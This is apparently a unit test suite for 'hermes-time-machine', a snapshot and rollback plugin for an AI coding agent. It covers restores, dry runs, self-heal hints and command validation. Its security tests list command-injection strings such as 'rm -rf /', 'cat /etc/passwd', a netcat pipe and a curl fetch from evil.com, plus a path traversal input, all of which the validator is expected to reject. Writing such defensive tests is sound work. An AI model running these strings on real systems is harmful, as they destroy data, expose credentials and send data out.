"""
Comprehensive Unit & Integration Test Suite for hermes-time-machine (v0.3.0).
Zero external test dependencies required — fully runnable with:
    python -m unittest discover -s tests -v
AND:
    pytest -v
"""
import ast
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

PLUGIN_DIR = Path(__file__).resolve().parent.parent
if str(PLUGIN_DIR) not in sys.path:
    sys.path.insert(0, str(PLUGIN_DIR))

try:
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from dashboard.plugin_api import router
    HAS_FASTAPI = True
except ImportError:
    HAS_FASTAPI = False
    router = None

from ledger import (
    TimeMachineLedger,
    parse_unified_diff,
    validate_safe_path,
    validate_verify_command,
    SAFE_TEST_RUNNERS,
    FORBIDDEN_SHELL_PATTERNS,
)
from tools import (
    LIST_SNAPSHOTS_SCHEMA,
    DIFF_SCHEMA,
    RESTORE_SCHEMA,
    BRANCH_SCHEMA,
    RECOVER_SCHEMA,
    SEARCH_SCHEMA,
    handle_list_snapshots,
    handle_diff,
    handle_restore,
    handle_branch,
    handle_recover,
    handle_search,
)
import __init__ as tm_plugin


class TestTimeMachineSuite(unittest.TestCase):
    """Full test suite covering Time Machine tools, ledger, security & self-heal."""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="tm_test_"))
        self.db_file = self.temp_dir / "time_machine.db"
        self.ledger = TimeMachineLedger(db_path=self.db_file)
        self.git_repo = self._init_git_repo(self.temp_dir)

    def tearDown(self):
        shutil.rmtree(str(self.temp_dir), ignore_errors=True)

    def _init_git_repo(self, base_dir: Path):
        env = os.environ.copy()
        subprocess.run(["git", "init"], cwd=str(base_dir), env=env, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.name", "Tester"], cwd=str(base_dir), env=env, check=True)
        subprocess.run(["git", "config", "user.email", "tester@example.com"], cwd=str(base_dir), env=env, check=True)

        f1 = base_dir / "file_a.py"
        f2 = base_dir / "file_b.py"
        f1.write_text("print('version 1 A')", encoding="utf-8")
        f2.write_text("print('version 1 B')", encoding="utf-8")

        subprocess.run(["git", "add", "."], cwd=str(base_dir), env=env, check=True, capture_output=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=str(base_dir), env=env, check=True, capture_output=True)
        c1 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(base_dir), env=env, check=True, capture_output=True, text=True).stdout.strip()
        return {"dir": base_dir, "c1": c1, "f1": f1, "f2": f2}

    # ─── 1. Structured Diff Parsing ──────────────────────────────────────────

    def test_parse_unified_diff(self):
        sample_diff = """diff --git a/src/auth.py b/src/auth.py
index 0000000..1111111 100644
--- a/src/auth.py
+++ b/src/auth.py
@@ -1,3 +1,5 @@
-old line
+new line 1
+new line 2
+new line 3
diff --git a/test.txt b/test.txt
new file mode 100644
--- /dev/null
+++ b/test.txt
@@ -0,0 +1 @@
+created
"""
        files = parse_unified_diff(sample_diff)
        self.assertEqual(len(files), 2)
        f1 = files[0]
        self.assertEqual(f1["path"], "src/auth.py")
        self.assertEqual(f1["status"], "modified")
        self.assertEqual(f1["additions"], 3)
        self.assertEqual(f1["deletions"], 1)
        self.assertIn("@@ -1,3 +1,5 @@", f1["diff_chunk"])

        f2 = files[1]
        self.assertEqual(f2["path"], "test.txt")
        self.assertEqual(f2["status"], "added")
        self.assertEqual(f2["additions"], 1)
        self.assertEqual(f2["deletions"], 0)

    # ─── 2. Ledger Recording & Self-Healing Flag ─────────────────────────────

    def test_ledger_record_and_self_heal(self):
        snap1 = self.ledger.record_pre_tool(
            session_id="s_heal",
            tool_name="write_file",
            args={"path": "main.py"},
            working_dir=str(self.temp_dir),
        )
        self.assertIsNotNone(snap1)
        s1_id = snap1["id"]

        self.ledger.record_post_tool(
            session_id="s_heal",
            tool_name="write_file",
            args={"path": "main.py"},
            status="ok",
        )

        self.ledger.record_pre_tool(
            session_id="s_heal",
            tool_name="terminal",
            args={"command": "pytest"},
            working_dir=str(self.temp_dir),
        )
        self.ledger.record_post_tool(
            session_id="s_heal",
            tool_name="terminal",
            args={"command": "pytest"},
            status="error",
            self_heal_candidate=True,
            recommended_snapshot_id=s1_id,
        )

        snaps = self.ledger.list_snapshots(session_id="s_heal")
        self.assertGreaterEqual(len(snaps), 2)
        latest = snaps[0]
        self.assertEqual(latest["tool_name"], "terminal")
        self.assertEqual(latest["self_heal_candidate"], 1)
        self.assertEqual(latest["recommended_snapshot_id"], s1_id)

    # ─── 3. Pre-Restore Safety Snapshot & Surgical File Restore ──────────────

    def test_surgical_file_restore_and_safety_backup(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]
        f2 = self.git_repo["f2"]

        f1.write_text("print('version 2 A BROKEN')", encoding="utf-8")
        f2.write_text("print('version 2 B GOOD')", encoding="utf-8")

        snap = self.ledger.record_pre_tool(
            session_id="s_surg",
            tool_name="write_file",
            args={"path": "file_a.py"},
            working_dir=str(wdir),
        )
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))

        res = self.ledger.restore_snapshot(
            snapshot_id=snap["id"],
            file_paths=["file_a.py"],
            working_dir=str(wdir),
            confirm=True,
        )

        self.assertTrue(res["ok"])
        self.assertTrue(res["files_restored"])
        self.assertIsNotNone(res["pre_restore_backup_id"])
        self.assertEqual(f1.read_text(encoding="utf-8"), "print('version 1 A')")
        self.assertEqual(f2.read_text(encoding="utf-8"), "print('version 2 B GOOD')")

    # ─── 4. Tool Handlers & Confirmation / Dry-Run Guard ─────────────────────

    def test_tool_handlers_and_confirmation(self):
        snap = self.ledger.record_pre_tool(
            session_id="s_tools",
            tool_name="patch",
            args={"patch": "test"},
            working_dir=str(self.temp_dir),
        )
        snap_id = snap["id"]

        diff_res = json.loads(handle_diff({"snapshot_id": snap_id}, ledger=self.ledger))
        self.assertIn("ok", diff_res)

        # confirm=False acts as dry-run preview
        res_no_confirm = json.loads(handle_restore({"snapshot_id": snap_id, "confirm": False}, ledger=self.ledger))
        self.assertTrue(res_no_confirm["ok"])
        self.assertTrue(res_no_confirm.get("dry_run", False))
        self.assertFalse(res_no_confirm.get("files_restored", False))
        self.assertIn("confirm=true", res_no_confirm.get("message", "").lower())

        b_res = json.loads(handle_branch({"snapshot_id": snap_id, "branch_title": "Phase 2 Branch"}, ledger=self.ledger))
        self.assertTrue(b_res["ok"])
        self.assertIn("new_session_id", b_res)

    # ─── 5. Slash Command /rewind ────────────────────────────────────────────

    def test_slash_command_rewind(self):
        self.ledger.record_pre_tool(
            session_id="s_cmd",
            tool_name="edit_file",
            args={"path": "api.py"},
            working_dir=str(self.temp_dir),
        )

        class CtxStub:
            def __init__(self):
                self.command_handler = None
            def register_hook(self, *a, **kw): pass
            def register_tool(self, *a, **kw): pass
            def register_command(self, name, handler, **kw): self.command_handler = handler
            def register_system_prompt_section(self, *a, **kw): pass

        stub = CtxStub()
        tm_plugin.register(stub, ledger=self.ledger)
        self.assertIsNotNone(stub.command_handler)

        out_list = stub.command_handler("list", session_id="s_cmd")
        self.assertIn("Time Machine Snapshots", out_list)

        out_diff = stub.command_handler("diff", session_id="s_cmd")
        self.assertTrue("Diff for" in out_diff or "Error" in out_diff)

    # ─── 6. Self-Healing Hint Injection ──────────────────────────────────────

    def test_self_healing_transform_hint(self):
        class CtxStub:
            def __init__(self):
                self.hooks = {}
            def register_hook(self, name, cb, **kw): self.hooks[name] = cb
            def register_tool(self, *a, **kw): pass
            def register_command(self, *a, **kw): pass
            def register_system_prompt_section(self, *a, **kw): pass

        stub = CtxStub()
        tm_plugin.register(stub)

        stub.hooks["on_session_start"](session_id="s_hint")
        stub.hooks["pre_tool_call"](tool_name="write_file", args={"path": "x.py"}, session_id="s_hint")
        stub.hooks["post_tool_call"](tool_name="write_file", args={"path": "x.py"}, status="ok", session_id="s_hint")

        fail_output = "================ FAILURES ================\nAssertionError: test failed"
        transformed = stub.hooks["transform_tool_result"](
            tool_name="terminal",
            result=fail_output,
            session_id="s_hint",
        )
        self.assertIn("[🛡️ Time Machine Self-Heal Notice", transformed)
        self.assertIn("time_machine_restore", transformed)

    # ─── 7. FastAPI Dashboard Router ─────────────────────────────────────────

    @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
    def test_dashboard_api_endpoints(self):
        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)

        res = client.get("/status")
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.json()["ok"])
        self.assertIn("snapshot_count", res.json())

        res2 = client.get("/snapshots")
        self.assertEqual(res2.status_code, 200)
        self.assertIn("snapshots", res2.json())

    # ─── 8. Path Traversal Security & Newly-Created File Rollback ─────────────

    def test_path_traversal_rejection(self):
        snap = self.ledger.record_pre_tool(
            session_id="s_sec",
            tool_name="write_file",
            args={"path": "safe.py"},
            working_dir=str(self.temp_dir),
        )
        res = self.ledger.restore_snapshot(
            snapshot_id=snap["id"],
            file_paths=["../../etc/passwd"],
            working_dir=str(self.temp_dir),
            confirm=True,
        )
        self.assertFalse(res["ok"])
        self.assertIn("escapes workspace root", res["error"])

    def test_newly_created_file_unlinked_on_restore(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]

        snap = self.ledger.record_pre_tool(
            session_id="s_newfile",
            tool_name="write_file",
            args={"path": "file_a.py"},
            working_dir=str(wdir),
        )
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))

        new_file = wdir / "unwanted_generated.tmp"
        new_file.write_text("temporary bad dump", encoding="utf-8")
        self.assertTrue(new_file.exists())

        res = self.ledger.restore_snapshot(
            snapshot_id=snap["id"],
            file_paths=["file_a.py", "unwanted_generated.tmp"],
            working_dir=str(wdir),
            confirm=True,
        )
        self.assertTrue(res["ok"])
        self.assertIn("unwanted_generated.tmp", res["unlinked_new_files"])
        self.assertFalse(new_file.exists())

    # ─── 9. Arbitrary A <-> B & Live Working Tree Diff ───────────────────────

    def test_arbitrary_and_working_tree_diff(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]

        f1.write_text("print('version 2')", encoding="utf-8")
        env = os.environ.copy()
        subprocess.run(["git", "add", "."], cwd=str(wdir), env=env, check=True)
        subprocess.run(["git", "commit", "-m", "second"], cwd=str(wdir), env=env, check=True)
        c2 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), env=env, check=True, capture_output=True, text=True).stdout.strip()

        snap1 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit", args={}, working_dir=str(wdir))
        snap2 = self.ledger.record_pre_tool(session_id="s_diff", tool_name="edit", args={}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap1["id"]))
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c2, snap2["id"]))

        diff_ab = self.ledger.get_diff(snapshot_id=snap2["id"], compare_to_id=snap1["id"], working_dir=str(wdir))
        self.assertTrue(diff_ab["ok"])
        self.assertEqual(diff_ab["mode"], "arbitrary")
        self.assertTrue(any(f["path"] == "file_a.py" for f in diff_ab.get("files", [])))

        f1.write_text("print('version 3 uncommitted')", encoding="utf-8")
        diff_wt = self.ledger.get_diff(snapshot_id=snap2["id"], compare_to_id="WORKING_TREE", working_dir=str(wdir))
        self.assertTrue(diff_wt["ok"])
        self.assertEqual(diff_wt["mode"], "working_tree")
        self.assertIn("version 3 uncommitted", diff_wt["diff"])

    # ─── 10. Storage Pruning & Storage Stats ─────────────────────────────────

    def test_prune_snapshots_and_storage_stats(self):
        for i in range(15):
            self.ledger.record_pre_tool(
                session_id="s_prune",
                tool_name="edit_file",
                args={"index": i},
                working_dir=str(self.temp_dir),
            )

        prot_snap = self.ledger.record_pre_tool(
            session_id="s_prune",
            tool_name="pre_restore_safety_backup",
            args={"target": "baseline"},
            working_dir=str(self.temp_dir),
        )

        stats = self.ledger.get_storage_stats()
        self.assertGreaterEqual(stats["total_snapshots"], 16)
        self.assertGreaterEqual(stats["total_sessions"], 1)

        prune_res = self.ledger.prune_snapshots(session_id="s_prune", keep_last=5)
        self.assertTrue(prune_res["ok"])
        self.assertGreater(prune_res["pruned_count"], 0)

        remaining = self.ledger.list_snapshots(session_id="s_prune", limit=100)
        remaining_ids = [s["id"] for s in remaining]
        self.assertIn(prot_snap["id"], remaining_ids)

    # ─── 11. Live Demo Walkthrough Integration & Slash Command ───────────────

    def test_demo_walkthrough_e2e(self):
        from scripts.demo_walkthrough import run_demo
        demo_result = run_demo(quiet=True)
        self.assertTrue(demo_result["ok"])
        steps = demo_result["steps"]
        self.assertTrue(steps["step1_baseline"]["pytest_passed"])
        self.assertTrue(steps["step3_bad_edit"]["test_failed_as_expected"])
        self.assertTrue(steps["step5_restore"]["billing_restored"])
        self.assertTrue(steps["step5_restore"]["new_file_unlinked"])
        self.assertTrue(steps["step5_restore"]["tax_feature_preserved"])
        self.assertTrue(steps["step5_restore"]["pytest_passed"])

    def test_slash_command_rewind_demo(self):
        class CtxStub:
            def __init__(self):
                self.command_handler = None
            def register_hook(self, *a, **kw): pass
            def register_tool(self, *a, **kw): pass
            def register_command(self, name, handler, **kw): self.command_handler = handler
            def register_system_prompt_section(self, *a, **kw): pass

        stub = CtxStub()
        tm_plugin.register(stub, ledger=self.ledger)
        out_demo = stub.command_handler("demo")
        self.assertIn("🎉 Time Machine E2E Live Demo Passed 100%!", out_demo)

    # ─── 12. Autonomous Self-Healing Recovery & Diagnosis ────────────────────

    def test_diagnose_failure_and_culprit_detection(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]

        snap_safe = self.ledger.record_pre_tool(
            session_id="s_diag",
            tool_name="write_file",
            args={"path": "file_a.py"},
            working_dir=str(wdir),
        )
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap_safe["id"]))
        self.ledger.record_post_tool(session_id="s_diag", tool_name="write_file", status="ok")

        f1.write_text("broken syntax error", encoding="utf-8")

        self.ledger.record_pre_tool(
            session_id="s_diag",
            tool_name="terminal",
            args={"command": "pytest"},
            working_dir=str(wdir),
        )
        traceback_err = "File 'file_a.py', line 1, in <module>\nSyntaxError: invalid syntax"
        self.ledger.record_post_tool(
            session_id="s_diag",
            tool_name="terminal",
            status="error",
            self_heal_candidate=True,
            recommended_snapshot_id=snap_safe["id"],
        )

        diag = self.ledger.diagnose_failure(session_id="s_diag", error_text=traceback_err, working_dir=str(wdir))
        self.assertTrue(diag["ok"])
        self.assertIn("file_a.py", diag["culprit_files"])
        self.assertEqual(diag["confidence"], "high")
        self.assertEqual(diag["recommended_snapshot_id"], snap_safe["id"])

    def test_time_machine_recover_auto_apply(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]
        f2 = self.git_repo["f2"]

        snap = self.ledger.record_pre_tool(session_id="s_rec", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))
        self.ledger.record_post_tool(session_id="s_rec", tool_name="edit_file", status="ok")

        f1.write_text("BROKEN", encoding="utf-8")
        f2.write_text("GOOD PRESERVED", encoding="utf-8")

        self.ledger.record_pre_tool(session_id="s_rec", tool_name="terminal", args={"command": "pytest"}, working_dir=str(wdir))
        self.ledger.record_post_tool(
            session_id="s_rec",
            tool_name="terminal",
            status="error",
            self_heal_candidate=True,
            recommended_snapshot_id=snap["id"],
        )

        # 1. auto_apply=False returns dry-run plan only
        plan = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=False)
        self.assertTrue(plan["ok"])
        self.assertFalse(plan["auto_applied"])
        self.assertTrue(plan.get("dry_run", False))
        self.assertIn("file_a.py", plan.get("planned_restored_files", []))

        # 2. auto_apply=True without confirm returns dry-run preview (not an unhandled failure)
        res_no_conf = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=True, confirm=False)
        self.assertTrue(res_no_conf["ok"])
        self.assertTrue(res_no_conf.get("dry_run", False))
        self.assertFalse(res_no_conf.get("auto_applied", False))

        # 3. auto_apply=True with confirm=True executes surgical recovery
        res_rec = self.ledger.recover(session_id="s_rec", error_summary="file_a.py failed", auto_apply=True, confirm=True, working_dir=str(wdir))
        self.assertTrue(res_rec["ok"])
        self.assertTrue(res_rec["auto_applied"])
        self.assertIn("file_a.py", res_rec["restored_files"])
        self.assertIsNotNone(res_rec["pre_restore_backup_id"])

        self.assertEqual(f1.read_text(encoding="utf-8"), "print('version 1 A')")
        self.assertEqual(f2.read_text(encoding="utf-8"), "GOOD PRESERVED")

    def test_time_machine_recover_tool_handler(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]

        snap = self.ledger.record_pre_tool(session_id="s_tool_rec", tool_name="write_file", args={}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))

        res_json = handle_recover(
            {"session_id": "s_tool_rec", "error_summary": "file_a.py error", "auto_apply": False},
            ledger=self.ledger,
        )
        res = json.loads(res_json)
        self.assertTrue(res["ok"])
        self.assertIn("diagnosis", res)

    @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
    def test_api_recover_and_export_endpoints(self):
        self.ledger.record_pre_tool(session_id="s_api", tool_name="patch", args={}, working_dir=str(self.temp_dir))

        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)

        res_exp = client.get("/snapshots/export?session_id=s_api")
        self.assertEqual(res_exp.status_code, 200)
        self.assertIn("Time Machine Timeline Report", res_exp.json()["markdown"])

        res_rec = client.post("/snapshots/recover", json={"session_id": "s_api", "auto_apply": False})
        self.assertEqual(res_rec.status_code, 200)
        self.assertTrue(res_rec.json()["ok"])

    def test_slash_command_recover_and_export(self):
        self.ledger.record_pre_tool(session_id="s_slash", tool_name="write_file", args={"path": "a.py"}, working_dir=str(self.temp_dir))

        class CtxStub:
            def __init__(self):
                self.command_handler = None
            def register_hook(self, *a, **kw): pass
            def register_tool(self, *a, **kw): pass
            def register_command(self, name, handler, **kw): self.command_handler = handler
            def register_system_prompt_section(self, *a, **kw): pass

        stub = CtxStub()
        tm_plugin.register(stub, ledger=self.ledger)

        out_export = stub.command_handler("export", session_id="s_slash")
        self.assertIn("Hermes Time Machine Timeline Report", out_export)

    def test_search_snapshots_diff_content(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]
        f2 = self.git_repo["f2"]

        s1 = self.ledger.record_pre_tool(session_id="s_search", tool_name="write_file", args={"path": "file_a.py"}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, s1["id"]))

        f1.write_text("print('version 2 ALPHA')", encoding="utf-8")
        f2.write_text("print('version 2 BETA UNIQUE_MARKER')", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=str(wdir), check=True, capture_output=True)
        subprocess.run(["git", "commit", "-m", "second commit"], cwd=str(wdir), check=True, capture_output=True)
        c2 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), check=True, capture_output=True, text=True).stdout.strip()

        s2 = self.ledger.record_pre_tool(session_id="s_search", tool_name="edit_file", args={"path": "file_b.py"}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c2, s2["id"]))

        res = self.ledger.search_snapshots(query="UNIQUE_MARKER", session_id="s_search", working_dir=str(wdir))
        self.assertTrue(res["ok"])
        self.assertGreaterEqual(res["total_matches"], 1)
        match0 = res["matches"][0]
        self.assertEqual(match0["snapshot_id"], s2["id"])
        self.assertIn("file_b.py", match0["matched_files"])

        res_scoped = self.ledger.search_snapshots(query="version", file_path="file_a.py", session_id="s_search", working_dir=str(wdir))
        self.assertTrue(res_scoped["ok"])
        for m in res_scoped["matches"]:
            for f in m["matched_files"]:
                self.assertIn("file_a.py", f)

        res_empty = self.ledger.search_snapshots(query="")
        self.assertFalse(res_empty["ok"])

    def test_time_machine_search_tool_handler(self):
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]

        s1 = self.ledger.record_pre_tool(session_id="s_tool_search", tool_name="write_file", args={"path": "file_a.py"}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, s1["id"]))

        res_json = handle_search({"query": "version 1", "session_id": "s_tool_search"}, ledger=self.ledger)
        res = json.loads(res_json)
        self.assertTrue(res["ok"])
        self.assertIn("total_matches", res)

    def test_recover_auto_verify_safe_allowlist(self):
        wdir = self.git_repo["dir"]
        f1 = self.git_repo["f1"]

        # Tracked test suite in baseline checkpoint
        test_ok = wdir / "test_ok.py"
        test_ok.write_text(
            "import unittest\nclass TestPass(unittest.TestCase):\n    def test_ok(self):\n        self.assertTrue(True)\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "test_ok.py"], cwd=str(wdir), check=True, capture_output=True)
        subprocess.run(["git", "commit", "-m", "add test_ok.py"], cwd=str(wdir), check=True, capture_output=True)
        c_base = subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(wdir), check=True, capture_output=True, text=True).stdout.strip()

        snap = self.ledger.record_pre_tool(session_id="s_rec_verify", tool_name="edit_file", args={"path": "file_a.py"}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c_base, snap["id"]))
        self.ledger.record_post_tool(session_id="s_rec_verify", tool_name="edit_file", status="ok")

        f1.write_text("CORRUPTED SYNTAX ERROR {{{", encoding="utf-8")

        self.ledger.record_pre_tool(session_id="s_rec_verify", tool_name="terminal", args={"command": "pytest"}, working_dir=str(wdir))
        self.ledger.record_post_tool(
            session_id="s_rec_verify",
            tool_name="terminal",
            status="error",
            self_heal_candidate=True,
            recommended_snapshot_id=snap["id"],
        )

        # 1. Verification with allowed test runner (python -m unittest test_ok)
        res = self.ledger.recover(
            session_id="s_rec_verify",
            error_summary="syntax error in file_a.py",
            auto_apply=True,
            confirm=True,
            auto_verify=True,
            verify_command=f'"{sys.executable}" -m unittest test_ok',
            working_dir=str(wdir),
        )
        self.assertTrue(res["ok"])
        self.assertTrue(res["auto_applied"])
        self.assertIsNotNone(res["verification"])
        self.assertTrue(res["verification"]["passed"], f"Verification failed: {res['verification']}")

        # 2. Verification command injection attempt blocked by security policy
        bad_cmd = "pytest; rm -rf /"
        res_bad = self.ledger.recover(
            session_id="s_rec_verify",
            error_summary="syntax error",
            auto_apply=True,
            confirm=True,
            auto_verify=True,
            verify_command=bad_cmd,
            working_dir=str(wdir),
        )
        self.assertTrue(res_bad["ok"])
        self.assertFalse(res_bad["verification"]["passed"])
        self.assertIn("forbidden shell operator", res_bad["verification"]["output_summary"])

    @unittest.skipIf(not HAS_FASTAPI, "fastapi not installed in environment")
    def test_api_search_endpoint(self):
        self.ledger.record_pre_tool(session_id="s_api_search", tool_name="edit_file", args={"path": "main.py"}, working_dir=str(self.temp_dir))

        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)

        res = client.get("/snapshots/search?q=main&session_id=s_api_search")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["ok"])
        self.assertEqual(data["query"], "main")
        self.assertIn("matches", data)

    def test_slash_command_search(self):
        self.ledger.record_pre_tool(session_id="s_slash_search", tool_name="write_file", args={"path": "calc.py"}, working_dir=str(self.temp_dir))

        class CtxStub:
            def __init__(self):
                self.command_handler = None
            def register_hook(self, *a, **kw): pass
            def register_tool(self, *a, **kw): pass
            def register_command(self, name, handler, **kw): self.command_handler = handler
            def register_system_prompt_section(self, *a, **kw): pass

        stub = CtxStub()
        tm_plugin.register(stub, ledger=self.ledger)

        out = stub.command_handler("search calc", session_id="s_slash_search")
        self.assertIn("search results for", out.lower())

    # ─── 13. Security Guarantees: Rule 9 & Command Injection & Dry-Run ─────────

    def test_security_zero_private_core_imports(self):
        """Rule 9 audit: prove tools.checkpoint_manager is NEVER imported."""
        code_files = [
            PLUGIN_DIR / "ledger.py",
            PLUGIN_DIR / "tools.py",
            PLUGIN_DIR / "__init__.py",
            PLUGIN_DIR / "schemas.py",
        ]
        for cf in code_files:
            text = cf.read_text(encoding="utf-8")
            self.assertNotIn("tools.checkpoint_manager", text, f"Found private core import in {cf.name}")
            tree = ast.parse(text, filename=str(cf))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        self.assertNotEqual(alias.name, "tools.checkpoint_manager")
                elif isinstance(node, ast.ImportFrom):
                    self.assertNotEqual(node.module, "tools.checkpoint_manager")

    def test_security_verify_command_allowlist_and_injection_blocks(self):
        """Prove command injection strings and non-allowlisted executables are rejected."""
        injections = [
            "pytest; rm -rf /",
            "pytest && cat /etc/passwd",
            "pytest || echo pwned",
            "pytest | nc 10.0.0.1 4444",
            "pytest `whoami`",
            "pytest $(id)",
            "pytest > leak.txt",
            "pytest < input.txt",
            "pytest \n rm file",
            "curl https://evil.com/payload.sh",
            "bash -c 'echo hacked'",
            "powershell -Command Get-Process",
            "python evil.py",  # python without -m is rejected
        ]
        for inj in injections:
            valid, args, reason = validate_verify_command(inj)
            self.assertFalse(valid, f"Expected {inj!r} to be blocked! Reason: {reason}")

        valid_commands = [
            "pytest",
            "pytest -q",
            "python -m unittest",
            "python -m pytest tests/",
            "npm test",
            "cargo test",
            "go test ./...",
            "ruff check .",
            "mypy src",
        ]
        for cmd in valid_commands:
            valid, args, reason = validate_verify_command(cmd)
            self.assertTrue(valid, f"Expected {cmd!r} to pass validation! Reason: {reason}")
            self.assertIsNotNone(args)

    def test_security_dry_run_preserves_disk_state(self):
        """Prove dry_run=True / confirm=False previews restoration without touching disk."""
        wdir = self.git_repo["dir"]
        c1 = self.git_repo["c1"]
        f1 = self.git_repo["f1"]

        f1.write_text("MODIFIED_CONTENT_NEVER_LOST", encoding="utf-8")
        stray_file = wdir / "stray_scratch.tmp"
        stray_file.write_text("stray content", encoding="utf-8")

        snap = self.ledger.record_pre_tool(session_id="s_dry", tool_name="edit", args={}, working_dir=str(wdir))
        with self.ledger._connect() as conn:
            conn.execute("UPDATE snapshots SET checkpoint_hash = ? WHERE id = ?", (c1, snap["id"]))

        # Call restore with confirm=False (dry-run)
        preview = self.ledger.restore_snapshot(
            snapshot_id=snap["id"],
            file_paths=["file_a.py", "stray_scratch.tmp"],
            working_dir=str(wdir),
            dry_run=True,
            confirm=False,
        )
        self.assertTrue(preview["ok"])
        self.assertTrue(preview.get("dry_run"))
        self.assertFalse(preview.get("files_restored"))
        self.assertIn("file_a.py", preview.get("planned_restored_files", []))
        self.assertIn("stray_scratch.tmp", preview.get("planned_deleted_stray_files", []))

        # Files on disk must NOT have changed!
        self.assertEqual(f1.read_text(encoding="utf-8"), "MODIFIED_CONTENT_NEVER_LOST")
        self.assertTrue(stray_file.exists())


if __name__ == "__main__":
    unittest.main()
